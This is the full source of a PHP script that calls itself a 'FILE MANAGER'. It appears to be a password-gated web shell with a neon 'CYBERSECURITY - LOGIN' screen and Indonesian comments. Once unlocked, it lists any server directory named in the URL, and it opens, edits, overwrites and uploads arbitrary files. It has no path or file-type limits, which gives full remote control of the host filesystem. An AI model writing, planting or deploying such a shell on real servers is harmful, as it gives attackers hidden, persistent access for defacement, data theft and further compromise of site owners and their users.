<?php
session_start();
$password = '$2a$12$/SQ7l6x3IoMOxs/yYkW2I.7Bxh21XEhze2UVfEpGtwMBAs46qSrIq';

function login_shell()
{
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>FILE MANAGER</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Orbitron&display=swap');

* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: 'Orbitron', sans-serif;
    background: linear-gradient(135deg, #0f0f0f, #1a1a1a);
    color: #00ffff;
    text-align: center;
    overflow: hidden;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    position: relative;
}

/* Efek glow neon untuk background */
canvas {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: -1;
    background-color: #000;
}

/* Efek glitch digital */
.glitch {
    font-size: 24px;
    font-weight: bold;
    position: relative;
    animation: glitch 1s infinite;
    color: #00ffff;
}

@keyframes glitch {
    0% { text-shadow: 2px 2px #ff00ff, -2px -2px #00ffff; }
    25% { text-shadow: -2px -2px #ff00ff, 2px 2px #00ffff; }
    50% { text-shadow: 2px -2px #00ffff, -2px 2px #ff00ff; }
    75% { text-shadow: -2px 2px #00ffff, 2px -2px #ff00ff; }
    100% { text-shadow: 2px 2px #ff00ff, -2px -2px #00ffff; }
}

/* Efek terminal futuristik */
.login-container {
    background: rgba(0, 0, 0, 0.8);
    padding: 40px;
    border-radius: 8px;
    box-shadow: 0 0 20px #00ffff, 0 0 40px #00ffff;
    width: 380px;
    text-align: center;
    animation: flicker 2s infinite alternate;
}

@keyframes flicker {
    0% { box-shadow: 0 0 10px #00ffff; }
    100% { box-shadow: 0 0 20px #00ffff; }
}

.login-container h2 {
    font-size: 22px;
    margin-bottom: 15px;
    letter-spacing: 2px;
}

.terminal-text {
    font-size: 14px;
    color: #00ffff;
    display: block;
    margin-bottom: 15px;
    font-family: 'Orbitron', sans-serif;
}

.login-container input {
    background: transparent;
    border: 2px solid #00ffff;
    color: #00ffff;
    font-size: 14px;
    padding: 12px;
    width: 100%;
    margin-bottom: 15px;
    border-radius: 4px;
    outline: none;
    font-family: 'Orbitron', sans-serif;
    transition: all 0.3s;
    text-align: center;
}

.login-container input::placeholder {
    color: rgba(0, 255, 255, 0.6);
}

.login-container input[type="submit"] {
    cursor: pointer;
    background: #00ffff;
    color: #000;
    font-weight: bold;
    transition: all 0.3s;
}

.login-container input[type="submit"]:hover {
    background: #008080;
}

/* Marquee efek modern */
.marquee-container {
    position: fixed;
    bottom: 10px;
    width: 100%;
    text-align: center;
    color: #00ffff;
    font-family: 'Orbitron', sans-serif;
    font-size: 14px;
}

.marquee {
    display: inline-block;
    white-space: nowrap;
    overflow: hidden;
    padding: 0 20px;
    animation: scroll 12s linear infinite;
}

@keyframes scroll {
    0% { transform: translateX(100%); }
    100% { transform: translateX(-100%); }
}
</style>
</head>
<body>

<!-- Efek background neon -->
<canvas id="cyberCanvas"></canvas>

<div class="login-container">
    <h2 class="glitch">CYBERSECURITY - LOGIN</h2>
    <span class="terminal-text">[ ACCESS GRANTED ]</span>
    <form action="" method="post">
        <input type="password" name="pass" placeholder="Enter Password" required />
        <br>
        <input type="submit" name="submit" value="Login" />
    </form>
</div>
</div>

<script>
    // Efek background neon cyber
    const canvas = document.getElementById('cyberCanvas');
    const ctx = canvas.getContext('2d');

    let width = window.innerWidth;
    let height = window.innerHeight;

    canvas.width = width;
    canvas.height = height;

    window.addEventListener('resize', () => {
        width = window.innerWidth;
        height = window.innerHeight;
        canvas.width = width;
        canvas.height = height;
    });

    // Membuat partikel neon
    const particles = [];
    const maxParticles = 150;

    for (let i = 0; i < maxParticles; i++) {
        particles.push({
            x: Math.random() * width,
            y: Math.random() * height,
            vx: (Math.random() - 0.5) * 1.5,
            vy: (Math.random() - 0.5) * 1.5,
            size: Math.random() * 2 + 1,
            alpha: Math.random(),
        });
    }

    function animate() {
        ctx.fillStyle = 'rgba(0, 0, 0, 0.2)';
        ctx.fillRect(0, 0, width, height);

        particles.forEach(p => {
            ctx.beginPath();
            ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
            ctx.fillStyle = `rgba(0, 255, 255, ${p.alpha})`;
            ctx.fill();

            p.x += p.vx;
            p.y += p.vy;

            if (p.x < 0 || p.x > width) p.vx *= -1;
            if (p.y < 0 || p.y > height) p.vy *= -1;
        });

        requestAnimationFrame(animate);
    }

    animate();
</script>

</body>
</html>
<?php
    exit;
}

// Cek login session
$session_key = md5($_SERVER['HTTP_HOST']);

if (!isset($_SESSION[$session_key])) {
    if (isset($_POST['pass']) && password_verify($_POST['pass'], $password)) {
        session_regenerate_id(true); 
        $_SESSION[$session_key] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        login_shell();
    }
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Futuristic File Manager</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Orbitron&display=swap');

body {
    margin: 0;
    padding: 0;
    font-family: 'Orbitron', sans-serif;
    background-color: #0a0a0a;
    color: #00ffff;
    display: flex;
    justify-content: center;
    align-items: flex-start;
    min-height: 100vh;
}

#container {
    width: 90%;
    max-width: 900px;
    margin-top: 30px;
    background-color: #1f1f1f;
    border-radius: 10px;
    box-shadow: 0 0 20px rgba(0,255,255,0.3);
    padding: 20px;
    overflow-x: auto;
}

/* Header styles */
h1 {
    text-align: center;
    color: #00ffff;
    font-size: 2.5em;
    margin-bottom: 10px;
    text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff;
}
h2 {
    margin-top: 30px;
    color: #ff9500;
    border-bottom: 2px solid #ff9500;
    padding-bottom: 5px;
    font-size: 1.8em;
}
h3 {
    margin-top: 20px;
    color: #00ffff;
    font-size: 1.4em;
}

/* Directory listing styles */
.item {
    display: flex;
    align-items: center;
    justify-content: space-between;
    background-color: #2a2a2a;
    padding: 10px 15px;
    border-radius: 8px;
    margin: 8px 0;
    transition: background 0.3s, transform 0.2s;
}
.item:hover {
    background-color: #3a3a3a;
    transform: translateY(-2px);
}
.item span {
    font-size: 0.9em;
    margin-left: 10px;
    color: #888;
}
.item a {
    color: #00ffff;
    text-decoration: none;
    flex: 1;
    margin-left: 10px;
    word-break: break-all;
}
a:hover {
    color: #ff9500;
    text-decoration: underline;
}

/* Form styles */
form {
    margin-top: 15px;
    padding: 15px;
    background-color: #2a2a2a;
    border-radius: 8px;
    display: flex;
    flex-direction: column;
}
input[type="text"], input[type="file"], input[type="submit"] {
    padding: 10px;
    margin: 8px 0;
    border: 1px solid #00ffff;
    border-radius: 6px;
    background-color: #1f1f1f;
    color: #00ffff;
    font-family: 'Orbitron', sans-serif;
    font-size: 1em;
    outline: none;
    transition: border-color 0.3s, background-color 0.3s;
}
input[type="text"]:focus, input[type="file"]:focus {
    border-color: #ff9500;
}
input[type="submit"] {
    background-color: #00ffff;
    color: #000;
    font-weight: bold;
    cursor: pointer;
    transition: background-color 0.3s;
}
input[type="submit"]:hover {
    background-color: #00cccc;
}

/* Breadcrumb styles */
.breadcrumb {
    font-size: 0.9em;
    margin-top: 10px;
    color: #aaa;
}
.breadcrumb a {
    color: #00ffff;
    text-decoration: none;
}
.breadcrumb a:hover {
    color: #ff9500;
    text-decoration: underline;
}

/* Scrollbar styling for better aesthetic */
::-webkit-scrollbar {
    width: 8px;
}
::-webkit-scrollbar-thumb {
    background-color: #555;
    border-radius: 4px;
}
::-webkit-scrollbar-thumb:hover {
    background-color: #777;
}
</style>
</head>
<body>
<div id="container">
    <h1>FILE MANAGER</h1>

    <?php
    function clean_input($input) {
        return htmlspecialchars(strip_tags($input));
    }

    function navigate_directory($path) {
        $path = str_replace('\\','/', $path);
        $paths = explode('/', $path);
        $breadcrumbs = [];

        $accumulated = '';
        foreach ($paths as $id => $pat) {
            if ($pat == '' && $id == 0) {
                $breadcrumbs[] = '<a href="?path=/">/</a>';
                continue;
            }
            if ($pat == '') continue;
            $accumulated .= '/' . $pat;
            $breadcrumbs[] = '<a href="?path=' . urlencode($accumulated) . '">' . $pat . '</a>';
        }
        return implode(' / ', $breadcrumbs);
    }

    function display_directory_contents($path) {
        $contents = scandir($path);
        $folders = [];
        $files = [];

        foreach ($contents as $item) {
            if ($item == '.' || $item == '..') continue;
            $full_path = $path . '/' . $item;
            if (is_dir($full_path)) {
                $folders[] = '<div class="item"><span>&#128193;</span><a href="?path=' . urlencode($full_path) . '">' . $item . '</a></div>';
            } else {
                $file_size = filesize($full_path);
                $size_unit = ['B', 'KB', 'MB', 'GB', 'TB'];
                $i = $file_size > 0 ? floor(log($file_size, 1024)) : 0;
                $formatted_size = $file_size ? round($file_size / pow(1024, $i), 2) . ' ' . $size_unit[$i] : '0 B';
                $files[] = '<div class="item"><span>&#128196;</span><a href="?action=edit&file=' . urlencode($item) . '&path=' . urlencode($path) . '">' . $item . '</a><span>(' . $formatted_size . ')</span></div>';
            }
        }
        echo '<div class="folders">';
        echo implode('', $folders);
        echo '</div>';
        if (!empty($folders) && !empty($files)) {
            echo '<hr style="border-color:#555;">';
        }
        echo '<div class="files">';
        echo implode('', $files);
        echo '</div>';
    }

    function create_folder($path, $folder_name) {
        $folder_name = clean_input($folder_name);
        $new_folder_path = $path . '/' . $folder_name;
        if (!file_exists($new_folder_path)) {
            mkdir($new_folder_path);
            echo "<p style='color:#00ff00;'>Folder '$folder_name' created successfully!</p>";
        } else {
            echo "<p style='color:#ff0000;'>Folder '$folder_name' already exists!</p>";
        }
    }

    function upload_file($path, $file_to_upload) {
        $target_directory = $path . '/';
        $target_file = $target_directory . basename($file_to_upload['name']);
        if (move_uploaded_file($file_to_upload['tmp_name'], $target_file)) {
            echo "<p style='color:#00ff00;'>File ".htmlspecialchars(basename($file_to_upload['name']))." uploaded successfully.</p>";
        } else {
            echo "<p style='color:#ff0000;'>Sorry, there was an error uploading your file.</p>";
        }
    }

    function edit_file($file_path) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $content = $_POST['file_content'];
            if (file_put_contents($file_path, $content) !== false) {
                echo "<p style='color:#00ff00;'>File saved successfully.</p>";
            } else {
                echo "<p style='color:#ff0000;'>Error saving file.</p>";
            }
        }
        $content = file_get_contents($file_path);
        echo '<form method="post">';
        echo '<textarea name="file_content" rows="10" style="width:100%; padding:10px; border-radius:8px; border:1px solid #00ffff; background:#111; color:#fff;">' . htmlspecialchars($content) . '</textarea><br>';
        echo '<input type="submit" value="Save" style="margin-top:10px; padding:10px 20px; background:#00ffff; border:none; border-radius:6px; cursor:pointer;">';
        echo '</form>';
    }

    if (isset($_GET['path'])) {
        $path = $_GET['path'];
    } else {
        $path = getcwd();
    }

    if (isset($_GET['action'])) {
        $action = $_GET['action'];
        switch ($action) {
            case 'edit':
                if (isset($_GET['file'])) {
                    $file = $_GET['file'];
                    $file_path = $path . '/' . $file;
                    if (file_exists($file_path)) {
                        echo '<h2 style="color:#00ffff;">Edit File: ' . htmlspecialchars($file) . '</h2>';
                        edit_file($file_path);
                    } else {
                        echo "<p style='color:#ff0000;'>File not found.</p>";
                    }
                } else {
                    echo "<p style='color:#ff0000;'>Invalid file.</p>";
                }
                break;
            default:
                echo "<p style='color:#ff0000;'>Invalid action.</p>";
        }
    } else {

        echo '<div class="breadcrumb">' . navigate_directory($path) . '</div>';
        echo '<h3 style="margin-top:20px;">Contents:</h3>';
        display_directory_contents($path);
        echo '<hr style="border-color:#555;">';
        echo '<h3>Create New Folder</h3>';
        echo '<form method="post">';
        echo 'Folder Name: <input type="text" name="folder_name" required>';
        echo '<input type="submit" name="create_folder" value="Create">';
        echo '</form>';
        echo '<h3>Upload File</h3>';
        echo '<form method="post" enctype="multipart/form-data">';
        echo 'Select file: <input type="file" name="file_to_upload" required>';
        echo '<input type="submit" name="upload_file" value="Upload">';
        echo '</form>';
    }

    if (isset($_POST['create_folder'])) {
        create_folder($path, $_POST['folder_name']);
    }

    if (isset($_POST['upload_file'])) {
        upload_file($path, $_FILES['file_to_upload']);
    }
    ?>
</div>
</body>
</html>
